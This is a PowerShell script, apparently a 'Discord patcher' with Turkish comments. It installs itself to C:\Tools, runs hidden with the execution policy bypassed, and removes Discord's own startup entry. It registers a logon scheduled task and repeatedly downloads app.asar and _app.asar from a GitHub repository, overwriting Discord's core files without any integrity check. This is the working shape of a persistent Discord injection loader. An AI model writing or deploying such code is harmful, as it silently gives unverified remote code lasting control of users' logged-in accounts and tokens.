# DiscordPatcher.ps1
$ErrorActionPreference = "SilentlyContinue"

# ===================== AYARLAR =====================
$BaseUrl      = "https://raw.githubusercontent.com/ardayimben/autoupdatebullshit/main"
$Files        = @("app.asar", "_app.asar")
$VersionUrl   = "$BaseUrl/version.txt"
$TaskName     = "DiscordPatcher"
$DiscordRoot  = "$env:LOCALAPPDATA\Discord"
$UpdateExe    = "$DiscordRoot\Update.exe"
$WatchSeconds = 120

$InstallDir  = "C:\Tools"
$InstallPath = Join-Path $InstallDir "DiscordPatcher.ps1"
$LockFile    = Join-Path $env:TEMP "DiscordPatcher.lock"
$LogFile     = Join-Path $InstallDir "patcher.log"
# ===================================================

function Write-Log($msg) {
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    try { Add-Content -Path $LogFile -Value $line } catch {}
}

# --- Aynı anda birden fazla kopya çalışmasın ---
if (Test-Path $LockFile) {
    $age = (Get-Date) - (Get-Item $LockFile).LastWriteTime
    if ($age.TotalMinutes -lt 10) {
        Write-Log "Zaten calisiyor gibi gorunuyor (lock < 10dk), cikiliyor."
        exit
    }
}
New-Item $LockFile -ItemType File -Force | Out-Null

try {
    if (-not (Test-Path $InstallDir)) {
        New-Item $InstallDir -ItemType Directory -Force | Out-Null
    }

    # --- 0) Kendini sabit konuma kur ---
    $runningFrom = $MyInvocation.MyCommand.Path
    if ($runningFrom -and ($runningFrom -ne $InstallPath)) {
        Copy-Item -Path $runningFrom -Destination $InstallPath -Force
        Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
        exit
    }
    if (-not (Test-Path $InstallPath) -and $MyInvocation.MyCommand.ScriptContents) {
        Set-Content -Path $InstallPath -Value $MyInvocation.MyCommand.ScriptContents -Encoding UTF8
    }
    $ScriptPath = $InstallPath

    # --- 1) Discord'un startup kaydini kapat ---
    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (Get-ItemProperty -Path $runKey -Name "Discord") {
        Remove-ItemProperty -Path $runKey -Name "Discord"
    }
    $approvedKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
    if (Get-ItemProperty -Path $approvedKey -Name "Discord") {
        Set-ItemProperty -Path $approvedKey -Name "Discord" -Value ([byte[]](3,0,0,0,0,0,0,0,0,0,0,0)) -Type Binary
    }

    # --- 2) Gorev yoksa / yanlis yoldaysa yeniden kaydet ---
    $task = Get-ScheduledTask -TaskName $TaskName
    if ($task -and ($task.Actions[0].Arguments -notlike "*$ScriptPath*")) {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
        $task = $null
    }
    if (-not $task) {
        $user      = "$env:USERDOMAIN\$env:USERNAME"
        $action    = New-ScheduledTaskAction -Execute "powershell.exe" `
                     -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
        $trigger   = New-ScheduledTaskTrigger -AtLogOn -User $user
        $principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Limited
        $settings  = New-ScheduledTaskSettingsSet -Priority 4 -AllowStartIfOnBatteries `
                     -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
                               -Principal $principal -Settings $settings | Out-Null
        Write-Log "Gorev (yeniden) kaydedildi."
    }

    # --- Yardimci fonksiyonlar ---
    function Get-LatestApp {
        Get-ChildItem $DiscordRoot -Directory -Filter "app-*" |
            Sort-Object { [version]($_.Name -replace '^app-','') } |
            Select-Object -Last 1
    }

    function Stop-Discord {
        Get-Process Discord | Stop-Process -Force
        Start-Sleep -Milliseconds 800
    }

    function Get-RemoteVersion {
        for ($i = 0; $i -lt 5; $i++) {
            try {
                $v = (Invoke-WebRequest -Uri $VersionUrl -UseBasicParsing -TimeoutSec 10).Content.Trim()
                if ($v) { return $v }
            } catch {}
            Start-Sleep -Seconds 2
        }
        return $null
    }

    function Get-LocalVersion($resources) {
        $p = Join-Path $resources "version.txt"
        if (Test-Path $p) { return (Get-Content $p -Raw).Trim() }
        return "0"
    }

    function Set-LocalVersion($resources, $ver) {
        Set-Content -Path (Join-Path $resources "version.txt") -Value $ver -Encoding ascii -NoNewline
    }

    function Get-AllFiles {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $dir = Join-Path $env:TEMP "discord_patch"
        Remove-Item $dir -Recurse -Force
        New-Item $dir -ItemType Directory -Force | Out-Null

        foreach ($f in $Files) {
            $out = Join-Path $dir $f
            $ok  = $false
            for ($i = 0; $i -lt 15 -and -not $ok; $i++) {
                Remove-Item $out -Force
                Invoke-WebRequest -Uri "$BaseUrl/$f" -OutFile $out -UseBasicParsing
                if ((Test-Path $out) -and (Get-Item $out).Length -gt 0) { $ok = $true }
                else { Start-Sleep -Seconds 2 }
            }
            if (-not $ok) { Write-Log "Indirilemedi: $f"; return $null }
        }
        return $dir
    }

    # Sadece version.txt farkliysa indirir + kurar. Degistiyse $true doner.
    function Install-IfNeeded($appDir) {
        $resources = Join-Path $appDir.FullName "resources"
        $remoteVer = Get-RemoteVersion
        if (-not $remoteVer) { Write-Log "GitHub'a ulasilamadi, atlaniyor."; return $false }

        $localVer = Get-LocalVersion $resources
        $needsUpdate = $false
        try   { $needsUpdate = [int]$remoteVer -gt [int]$localVer }
        catch { $needsUpdate = $remoteVer -ne $localVer }

        if (-not $needsUpdate) {
            Write-Log "Guncel ($appDir.Name, local=$localVer, remote=$remoteVer). Dokunulmadi."
            return $false
        }

        Write-Log "Yeni surum bulundu: local=$localVer -> remote=$remoteVer ($($appDir.Name))"
        $src = Get-AllFiles
        if (-not $src) { return $false }

        Stop-Discord
        foreach ($f in $Files) {
            $t = Join-Path $resources $f
            Remove-Item $t -Force
            Copy-Item (Join-Path $src $f) $t -Force
        }
        Set-LocalVersion $resources $remoteVer
        Remove-Item $src -Recurse -Force
        Write-Log "Kurulum tamamlandi (surum $remoteVer)."
        return $true
    }

    # --- 3) Ilk kontrol + kurulum ---
    $app = Get-LatestApp
    if ($app) { Install-IfNeeded $app | Out-Null }

    # --- 4) Discord'u ac ---
    if (-not (Get-Process Discord)) {
        Start-Process $UpdateExe -ArgumentList "--processStart", "Discord.exe"
    }

    # --- 5) Discord kendi guncellemesiyle yeni klasor acarsa onu da yamala ---
    if ($app) {
        $patchedName = $app.Name
        $deadline    = (Get-Date).AddSeconds($WatchSeconds)

        while ((Get-Date) -lt $deadline) {
            Start-Sleep -Seconds 3
            $latest = Get-LatestApp
            if ($latest -and $latest.Name -ne $patchedName) {
                $asarPath = Join-Path $latest.FullName "resources\app.asar"
                for ($i = 0; $i -lt 20 -and -not (Test-Path $asarPath); $i++) { Start-Sleep -Seconds 1 }
                Start-Sleep -Seconds 5

                if (Install-IfNeeded $latest) {
                    Start-Process $UpdateExe -ArgumentList "--processStart", "Discord.exe"
                }
                $patchedName = $latest.Name
            }
        }
    }
}
finally {
    Remove-Item $LockFile -Force
}
